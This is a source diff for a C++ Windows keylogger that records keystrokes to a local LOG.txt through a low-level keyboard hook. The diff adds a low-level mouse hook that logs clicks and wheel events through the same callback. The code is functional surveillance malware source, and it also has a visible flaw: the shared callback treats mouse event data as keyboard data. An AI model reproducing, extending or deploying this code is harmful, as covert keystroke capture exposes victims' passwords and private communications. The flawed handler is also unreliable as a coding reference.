@@ -7,6 +7,7 @@
 using namespace std;
  
 HHOOK keyboard_hHock = NULL; // Keyboard Hook
+HHOOK mouse_hHock = NULL; // Mouse Hook
  
 
 const char* file = "LOG.txt"; // Path to the file where the key logs are saved
@@ -22,11 +23,11 @@ void SaveKey(const char* key)
     fclose(outputFile);      
 }
 
- 
+
 
 
 KBDLLHOOKSTRUCT  kbdStruct;
-
+ 
  
 // HOOK -----------------------------------------------------------------------------------------------
 #pragma warning (disable : 4996)
@@ -34,25 +35,35 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode >= HC_ACTION) // Checks if wParam and lParam contain valid data or not. If nCode is HC_ACTION (0), then they do, otherwise they do not.
     {
+        //PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
+        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);    //  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.  
 
-        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
-        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);    //  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-      
-    
+
+       /* switch (wParam) {
+        case WM_LBUTTONDOWN:  SaveKey("KEYMOUSE"); break;
+        case WM_RBUTTONDOWN: puts("WM_RBUTTONDOWN"); break;
+        }*/
+
+        switch (wParam)
+        {
+           case WM_LBUTTONDOWN: SaveKey("<L_MOUSE>"); break;
+           case WM_RBUTTONDOWN: SaveKey("<R_MOUSE>"); break;
+           case WM_MBUTTONDOWN: SaveKey("<M_MOUSE>"); break;
+           case WM_MOUSEWHEEL: SaveKey("<MOUSE_WHEEL>"); break;
+        
+           default:
+            break;
+        }
 
 
         if (kbdStruct.vkCode != 0)
         {
-
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
                {
                    //switch (p->vkCode) {
                    switch (kbdStruct.vkCode) {
             
-                        // Special Keys / Invisible keys
-                        case VK_LBUTTON:	SaveKey("<L_MOUSE>");	break;
-                        case VK_RBUTTON:	SaveKey("<R_MOUSE>");	break;
-                        case VK_MBUTTON:	SaveKey("<M_MOUSE>");	break;
+                        // Special Keys / Invisible keys     
 
                         case VK_SNAPSHOT:	SaveKey("<PRINT_SCREEN>"); break;
                         case VK_APPS:	    SaveKey("<APP_KEY>");   break;
@@ -127,10 +138,16 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
 
 
 
+
+
+
+
+// MAIN -------------------------------------------------------------------------------------------------
 int main()
 {
     MSG msg;
     keyboard_hHock = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelHook, NULL, NULL);   // The hook (keyboard hook)
+    mouse_hHock = SetWindowsHookEx(WH_MOUSE_LL, LowLevelHook, NULL, NULL);   // The hook (Mouse hook)
    
     // Listen for msg / listen for keys
     while (!GetMessage(&msg, NULL, NULL, NULL))
@@ -140,8 +157,8 @@ int main()
     }
 
     UnhookWindowsHookEx(keyboard_hHock); // Remove hook before closing tha app
+    UnhookWindowsHookEx(mouse_hHock); // Remove hook before closing tha app
 }
-
 
 
 
